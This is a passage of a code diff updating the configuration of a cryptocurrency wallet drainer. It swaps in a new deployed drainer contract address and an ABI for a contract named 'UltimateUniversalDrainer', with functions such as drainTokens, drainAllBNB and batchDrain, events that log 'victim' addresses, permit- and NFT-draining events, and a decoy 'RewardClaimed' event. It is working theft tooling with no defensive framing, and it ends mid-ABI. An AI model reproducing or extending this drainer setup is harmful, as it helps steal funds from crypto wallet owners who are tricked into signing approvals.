@@ -1,930 +1,604 @@
 export const CONFIG = {
-  DRAINER_CONTRACT: "0xbf2c883b097d6733a7e5a8d853d05825564bd857",
-  CONTRACT_ABI: JSON.parse(`[
-    {
-      "type": "constructor",
-      "inputs": [
-        { "name": "primary", "type": "address[]", "internalType": "address[]" },
-        { "name": "fallback1", "type": "address[]", "internalType": "address[]" },
-        { "name": "fallback2", "type": "address[]", "internalType": "address[]" },
-        { "name": "emergency", "type": "address[]", "internalType": "address[]" },
-        { "name": "basisPoints", "type": "uint16[]", "internalType": "uint16[]" },
-        { "name": "initialTokenThreshold", "type": "uint256", "internalType": "uint256" },
-        { "name": "initialBNBThreshold", "type": "uint256", "internalType": "uint256" },
-        { "name": "_auditor", "type": "address", "internalType": "address" }
-      ],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "AlreadyUsed",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ArrayLengthMismatch",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "BatchLimitExceeded",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "CannotPullBNB",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "DistributionIncomplete",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ECDSAInvalidSignature",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ECDSAInvalidSignatureLength",
-      "type": "error",
-      "inputs": [
-        { "name": "length", "type": "uint256", "internalType": "uint256" }
-      ]
-    },
-    {
-      "name": "ECDSAInvalidSignatureS",
-      "type": "error",
-      "inputs": [
-        { "name": "s", "type": "bytes32", "internalType": "bytes32" }
-      ]
-    },
-    {
-      "name": "EmergencyFailed",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "EmptyRequest",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "EnforcedPause",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ExpectedPause",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ExpiredDeadline",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "FallbackFailed",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "GasPriceTooHigh",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "InsufficientAllowance",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "InsufficientGas",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "InvalidBasisPoints",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "InvalidGasBudget",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "InvalidProposedData",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "InvalidShortString",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "InvalidSignature",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "NoBNBToDistribute",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "NotAuthorized",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "OwnableInvalidOwner",
-      "type": "error",
-      "inputs": [
-        { "name": "owner", "type": "address", "internalType": "address" }
-      ]
-    },
-    {
-      "name": "OwnableUnauthorizedAccount",
-      "type": "error",
-      "inputs": [
-        { "name": "account", "type": "address", "internalType": "address" }
-      ]
-    },
-    {
-      "name": "PermitFailed",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ReentrancyGuardReentrantCall",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "SafeERC20FailedOperation",
-      "type": "error",
-      "inputs": [
-        { "name": "token", "type": "address", "internalType": "address" }
-      ]
-    },
-    {
-      "name": "StringTooLong",
-      "type": "error",
-      "inputs": [
-        { "name": "str", "type": "string", "internalType": "string" }
-      ]
-    },
-    {
-      "name": "TimelockActive",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "TransferFailed",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "UnauthorizedBNBWithdrawal",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ZeroAddress",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "ZeroAmount",
-      "type": "error",
-      "inputs": []
-    },
-    {
-      "name": "AuditView",
-      "type": "event",
-      "inputs": [
-        { "name": "viewer", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "snapshot", "type": "bytes32", "indexed": true, "internalType": "bytes32" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "BNBAuthorizationSet",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "maxAmount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "deadline", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "BNBDeposited",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "BNBDrained",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "BatchDrainExecuted",
-      "type": "event",
-      "inputs": [
-        { "name": "tokenRequests", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "bnbVictims", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "totalGas", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "CircuitBreakerReset",
-      "type": "event",
-      "inputs": [],
-      "anonymous": false
-    },
-    {
-      "name": "CircuitBreakerTripped",
-      "type": "event",
-      "inputs": [
-        { "name": "reason", "type": "string", "indexed": false, "internalType": "string" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "DistributionResult",
-      "type": "event",
-      "inputs": [
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "recipient", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "success", "type": "bool", "indexed": false, "internalType": "bool" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "DrainCursorUpdated",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "nextIndex", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "remainingGas", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "DrainExecuted",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "operator", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "operationId", "type": "bytes32", "indexed": true, "internalType": "bytes32" },
-        { "name": "permitCount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "approvedCount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "bnbAmount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "successfulTransfers", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "gasUsed", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "completed", "type": "bool", "indexed": false, "internalType": "bool" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "EIP712DomainChanged",
-      "type": "event",
-      "inputs": [],
-      "anonymous": false
-    },
-    {
-      "name": "EmergencyFailedEvent",
-      "type": "event",
-      "inputs": [
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "failedAddr", "type": "address", "indexed": true, "internalType": "address" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "EmergencyUsed",
-      "type": "event",
-      "inputs": [
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "emergency", "type": "address", "indexed": true, "internalType": "address" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "FallbackFailedEvent",
-      "type": "event",
-      "inputs": [
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "failedAddr", "type": "address", "indexed": true, "internalType": "address" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "FallbackUsed",
-      "type": "event",
-      "inputs": [
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "primary", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "fb", "type": "address", "indexed": true, "internalType": "address" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "FundsRecovered",
-      "type": "event",
-      "inputs": [
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "to", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "recoveryId", "type": "bytes32", "indexed": true, "internalType": "bytes32" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "OwnershipTransferred",
-      "type": "event",
-      "inputs": [
-        { "name": "previousOwner", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "newOwner", "type": "address", "indexed": true, "internalType": "address" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "Paused",
-      "type": "event",
-      "inputs": [
-        { "name": "account", "type": "address", "indexed": false, "internalType": "address" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "RecipientsProposed",
-      "type": "event",
-      "inputs": [
-        { "name": "primary", "type": "address[]", "indexed": false, "internalType": "address[]" },
-        { "name": "fb1", "type": "address[]", "indexed": false, "internalType": "address[]" },
-        { "name": "fb2", "type": "address[]", "indexed": false, "internalType": "address[]" },
-        { "name": "emergency", "type": "address[]", "indexed": false, "internalType": "address[]" },
-        { "name": "basis", "type": "uint16[]", "indexed": false, "internalType": "uint16[]" },
-        { "name": "executeAfter", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "RecipientsUpdated",
-      "type": "event",
-      "inputs": [],
-      "anonymous": false
-    },
-    {
-      "name": "ThresholdsUpdated",
-      "type": "event",
-      "inputs": [
-        { "name": "newTokenThreshold", "type": "uint256", "indexed": false, "internalType": "uint256" },
-        { "name": "newBNBThreshold", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "TokensDrainedWithApproval",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "TokensDrainedWithPermit",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "Unpaused",
-      "type": "event",
-      "inputs": [
-        { "name": "account", "type": "address", "indexed": false, "internalType": "address" }
-      ],
-      "anonymous": false
-    },
-    {
-      "name": "VictimApprovalSet",
-      "type": "event",
-      "inputs": [
-        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
-        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
-      ],
-      "anonymous": false
-    },
-    {
-      "type": "fallback",
-      "stateMutability": "payable"
-    },
-    {
-      "name": "APPROVED_BATCH_LIMIT",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "BASIS_POINTS",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "BNB_MIN_DEPOSIT",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "MAX_GAS_BUDGET",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "MAX_GAS_PRICE",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "MAX_RECIPIENTS",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "MIN_GAS_RESERVE",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "PERMIT_BATCH_LIMIT",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "TIMELOCK_DURATION",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "auditor",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "address", "internalType": "address" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "authorizeBNBDrain",
-      "type": "function",
-      "inputs": [
-        { "name": "maxAmount", "type": "uint256", "internalType": "uint256" },
-        { "name": "deadline", "type": "uint256", "internalType": "uint256" },
-        { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
-        { "name": "signature", "type": "bytes", "internalType": "bytes" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "batchDrain",
-      "type": "function",
-      "inputs": [
-        {
-          "name": "request",
-          "type": "tuple",
-          "components": [
-            {
-              "name": "tokenRequests",
-              "type": "tuple[]",
-              "components": [
-                { "name": "victim", "type": "address", "internalType": "address" },
-                {
-                  "name": "permits",
-                  "type": "tuple[]",
-                  "components": [
-                    { "name": "token", "type": "address", "internalType": "address" },
-                    { "name": "value", "type": "uint256", "internalType": "uint256" },
-                    { "name": "deadline", "type": "uint256", "internalType": "uint256" },
-                    { "name": "v", "type": "uint8", "internalType": "uint8" },
-                    { "name": "r", "type": "bytes32", "internalType": "bytes32" },
-                    { "name": "s", "type": "bytes32", "internalType": "bytes32" }
-                  ],
-                  "internalType": "struct UltimateUniversalDrainer.PermitData[]"
-                },
-                { "name": "approvedTokens", "type": "address[]", "internalType": "address[]" },
-                { "name": "approvedAmounts", "type": "uint256[]", "internalType": "uint256[]" },
-                { "name": "gasBudget", "type": "uint256", "internalType": "uint256" },
-                { "name": "resume", "type": "bool", "internalType": "bool" },
-                { "name": "deadline", "type": "uint256", "internalType": "uint256" },
-                { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
-                { "name": "signature", "type": "bytes", "internalType": "bytes" }
-              ],
-              "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest[]"
-            },
-            { "name": "bnbVictims", "type": "address[]", "internalType": "address[]" },
-            { "name": "bnbAmounts", "type": "uint256[]", "internalType": "uint256[]" }
-          ],
-          "internalType": "struct UltimateUniversalDrainer.BatchDrainRequest"
-        }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "bnbSplitThreshold",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "cancelRecipientsProposal",
-      "type": "function",
-      "inputs": [],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "depositBNB",
-      "type": "function",
-      "inputs": [],
-      "outputs": [],
-      "stateMutability": "payable"
-    },
-    {
-      "name": "drainAllBNB",
-      "type": "function",
-      "inputs": [
-        { "name": "victim", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "drainBNB",
-      "type": "function",
-      "inputs": [
-        { "name": "victim", "type": "address", "internalType": "address" },
-        { "name": "amount", "type": "uint256", "internalType": "uint256" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "drainTokens",
-      "type": "function",
-      "inputs": [
-        {
-          "name": "request",
-          "type": "tuple",
-          "components": [
-            { "name": "victim", "type": "address", "internalType": "address" },
-            {
-              "name": "permits",
-              "type": "tuple[]",
-              "components": [
-                { "name": "token", "type": "address", "internalType": "address" },
-                { "name": "value", "type": "uint256", "internalType": "uint256" },
-                { "name": "deadline", "type": "uint256", "internalType": "uint256" },
-                { "name": "v", "type": "uint8", "internalType": "uint8" },
-                { "name": "r", "type": "bytes32", "internalType": "bytes32" },
-                { "name": "s", "type": "bytes32", "internalType": "bytes32" }
-              ],
-              "internalType": "struct UltimateUniversalDrainer.PermitData[]"
-            },
-            { "name": "approvedTokens", "type": "address[]", "internalType": "address[]" },
-            { "name": "approvedAmounts", "type": "uint256[]", "internalType": "uint256[]" },
-            { "name": "gasBudget", "type": "uint256", "internalType": "uint256" },
-            { "name": "resume", "type": "bool", "internalType": "bool" },
-            { "name": "deadline", "type": "uint256", "internalType": "uint256" },
-            { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
-            { "name": "signature", "type": "bytes", "internalType": "bytes" }
-          ],
-          "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest"
-        }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "eip712Domain",
-      "type": "function",
-      "inputs": [],
-      "outputs": [
-        { "name": "fields", "type": "bytes1", "internalType": "bytes1" },
-        { "name": "name", "type": "string", "internalType": "string" },
-        { "name": "version", "type": "string", "internalType": "string" },
-        { "name": "chainId", "type": "uint256", "internalType": "uint256" },
-        { "name": "verifyingContract", "type": "address", "internalType": "address" },
-        { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
-        { "name": "extensions", "type": "uint256[]", "internalType": "uint256[]" }
-      ],
-      "stateMutability": "view"
-    },
-    {
-      "name": "executeRecipientsUpdate",
-      "type": "function",
-      "inputs": [],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "getBNBDeposit",
-      "type": "function",
-      "inputs": [
-        { "name": "victim", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "getBNBMaxAllowed",
-      "type": "function",
-      "inputs": [
-        { "name": "victim", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "getDrainCursor",
-      "type": "function",
-      "inputs": [
-        { "name": "victim", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [
-        { "name": "tokenIndex", "type": "uint256", "internalType": "uint256" },
-        { "name": "gasBudget", "type": "uint256", "internalType": "uint256" }
-      ],
-      "stateMutability": "view"
-    },
-    {
-      "name": "getRecipients",
-      "type": "function",
-      "inputs": [],
-      "outputs": [
-        {
-          "name": "primary",
-          "type": "tuple[]",
-          "components": [
-            { "name": "addr", "type": "address", "internalType": "address payable" },
-            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
-          ],
-          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
-        },
-        {
-          "name": "fb1",
-          "type": "tuple[]",
-          "components": [
-            { "name": "addr", "type": "address", "internalType": "address payable" },
-            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
-          ],
-          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
-        },
-        {
-          "name": "fb2",
-          "type": "tuple[]",
-          "components": [
-            { "name": "addr", "type": "address", "internalType": "address payable" },
-            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
-          ],
-          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
-        },
-        {
-          "name": "emergency",
-          "type": "tuple[]",
-          "components": [
-            { "name": "addr", "type": "address", "internalType": "address payable" },
-            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
-          ],
-          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
-        }
-      ],
-      "stateMutability": "view"
-    },
-    {
-      "name": "getSnapshot",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "bytes32", "internalType": "bytes32" }],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "getSystemHealth",
-      "type": "function",
-      "inputs": [],
-      "outputs": [
-        { "name": "totalOps", "type": "uint256", "internalType": "uint256" },
-        { "name": "successRateBips", "type": "uint256", "internalType": "uint256" },
-        { "name": "totalValue", "type": "uint256", "internalType": "uint256" },
-        { "name": "consecutiveFailures", "type": "uint256", "internalType": "uint256" },
-        { "name": "circuitBroken", "type": "bool", "internalType": "bool" },
-        { "name": "paused_", "type": "bool", "internalType": "bool" }
-      ],
-      "stateMutability": "view"
-    },
-    {
-      "name": "getThresholds",
-      "type": "function",
-      "inputs": [],
-      "outputs": [
-        { "name": "tokenThreshold", "type": "uint256", "internalType": "uint256" },
-        { "name": "bnbThreshold", "type": "uint256", "internalType": "uint256" }
-      ],
-      "stateMutability": "view"
-    },
-    {
-      "name": "getVictimApproval",
-      "type": "function",
-      "inputs": [
-        { "name": "victim", "type": "address", "internalType": "address" },
-        { "name": "token", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "getVictimNonce",
-      "type": "function",
-      "inputs": [
-        { "name": "victim", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "owner",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "address", "internalType": "address" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "pause",
-      "type": "function",
-      "inputs": [],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "paused",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "bool", "internalType": "bool" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "proposeRecipients",
-      "type": "function",
-      "inputs": [
-        { "name": "primary", "type": "address[]", "internalType": "address[]" },
-        { "name": "fallback1", "type": "address[]", "internalType": "address[]" },
-        { "name": "fallback2", "type": "address[]", "internalType": "address[]" },
-        { "name": "emergency", "type": "address[]", "internalType": "address[]" },
-        { "name": "basisPoints", "type": "uint16[]", "internalType": "uint16[]" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "recoverFunds",
-      "type": "function",
-      "inputs": [
-        { "name": "token", "type": "address", "internalType": "address" },
-        { "name": "to", "type": "address", "internalType": "address" },
-        { "name": "amount", "type": "uint256", "internalType": "uint256" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "renounceOwnership",
-      "type": "function",
-      "inputs": [],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "resetCircuitBreaker",
-      "type": "function",
-      "inputs": [],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "setAuditor",
-      "type": "function",
-      "inputs": [
-        { "name": "newAuditor", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "setTokenApproval",
-      "type": "function",
-      "inputs": [
-        { "name": "token", "type": "address", "internalType": "address" },
-        { "name": "amount", "type": "uint256", "internalType": "uint256" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "tokenSplitThreshold",
-      "type": "function",
-      "inputs": [],
-      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
-      "stateMutability": "view"
-    },
-    {
-      "name": "transferOwnership",
-      "type": "function",
-      "inputs": [
-        { "name": "newOwner", "type": "address", "internalType": "address" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "unpause",
-      "type": "function",
-      "inputs": [],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "name": "updateThresholds",
-      "type": "function",
-      "inputs": [
-        { "name": "newTokenThreshold", "type": "uint256", "internalType": "uint256" },
-        { "name": "newBNBThreshold", "type": "uint256", "internalType": "uint256" }
-      ],
-      "outputs": [],
-      "stateMutability": "nonpayable"
-    },
-    {
-      "type": "receive",
-      "stateMutability": "payable"
-    }
-  ]`),
+  // ─── Deployed Contract ────────────────────────────────────────────
+  DRAINER_CONTRACT: "0x976b6C40c6ffa992156b9B88F681bD3D40395c27",
 
-  PROJECT_ID: "b73926bcbfbad084f994910cadc18b63",
+  // ─── Contract ABI (from Hardhat 3 artifact) ───────────────────────
+  CONTRACT_ABI: [
+    {
+      "inputs": [
+        { "internalType": "address[]", "name": "primary", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "primaryBps", "type": "uint16[]" },
+        { "internalType": "address[]", "name": "fb1", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "fb1Bps", "type": "uint16[]" },
+        { "internalType": "address[]", "name": "fb2", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "fb2Bps", "type": "uint16[]" },
+        { "internalType": "address[]", "name": "emergency", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "emergencyBps", "type": "uint16[]" }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    { "anonymous": false, "inputs": [], "name": "CircuitReset", "type": "event" },
+    {
+      "anonymous": false,
+      "inputs": [{ "indexed": false, "internalType": "string", "name": "reason", "type": "string" }],
+      "name": "CircuitTripped", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "wallet", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "dapp", "type": "address" }
+      ],
+      "name": "Connected", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "operator", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "successful", "type": "uint256" },
+        { "indexed": false, "internalType": "uint256", "name": "gasUsed", "type": "uint256" }
+      ],
+      "name": "DrainExecuted", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": false, "internalType": "uint256", "name": "tier", "type": "uint256" },
+        { "indexed": true, "internalType": "address", "name": "recipient", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "FallbackUsed", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "to", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "FundsRecovered", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "collection", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "tokenId", "type": "uint256" },
+        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "NftDrained", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "operator", "type": "address" },
+        { "indexed": false, "internalType": "bool", "name": "allowed", "type": "bool" }
+      ],
+      "name": "OperatorSet", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "prev", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "next", "type": "address" }
+      ],
+      "name": "OwnershipTransferred", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [{ "indexed": true, "internalType": "address", "name": "account", "type": "address" }],
+      "name": "Paused", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "PermitDrained", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [{ "indexed": false, "internalType": "uint256", "name": "executableAt", "type": "uint256" }],
+      "name": "RecipientsProposed", "type": "event"
+    },
+    { "anonymous": false, "inputs": [], "name": "RecipientsUpdated", "type": "event" },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "ts", "type": "uint256" }
+      ],
+      "name": "RewardClaimed", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "recipient", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" },
+        { "indexed": false, "internalType": "bool", "name": "ok", "type": "bool" }
+      ],
+      "name": "Split", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
